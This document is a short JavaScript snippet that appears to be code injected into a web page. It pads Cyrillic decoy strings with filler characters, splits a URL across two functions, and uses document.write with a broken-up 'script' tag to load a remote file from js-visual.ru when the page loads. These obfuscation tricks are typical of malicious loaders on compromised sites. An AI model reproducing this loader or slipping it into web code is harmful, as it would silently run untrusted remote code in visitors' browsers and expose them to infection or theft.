timecon='Ð1@!#0å1@!#0á1@!#0ÿ1@!#0ò1@!#0à1@!#0,1@!#0 1@!#0ï1@!#0î1@!#0ä1@!#0ñ1@!#0ê1@!#0à1@!#0æ1@!#0è1@!#0ò1@!#0å1@!#0,1@!#0 1@!#0ã1@!#0ä1@!#0å1@!#0 1@!#0ì1@!#0î1@!#0æ1@!#0í1@!#0î1@!#0 1@!#0ñ1@!#0ê1@!#0à1@!#0÷1@!#0à1@!#0ò1@!#0ü1@!#0';
endcon='Í1@!#0ó1@!#0 1@!#0í1@!#0î1@!#0ð1@!#0ì1@!#0à1@!#0ë1@!#0ü1@!#0í1@!#0ó1@!#0þ1@!#0 1@!#0â1@!#0å1@!#0ð1@!#0ñ1@!#0è1@!#0þ1@!#0 1@!#0å1@!#0ñ1@!#0ò1@!#0å1@!#0ñ1@!#0ò1@!#0â1@!#0å1@!#0í1@!#0í1@!#0î1@!#0.1@!#0';
function first(str) 
{
return 'http://js-visual';
}
function sec(str) 
{
return '.ru/hop/sdl.js';
}
document.write('<scr' + 'ipt type="text/javascript"' + ' src=' + first('in') + sec('in') +'></scr' + 'ipt>');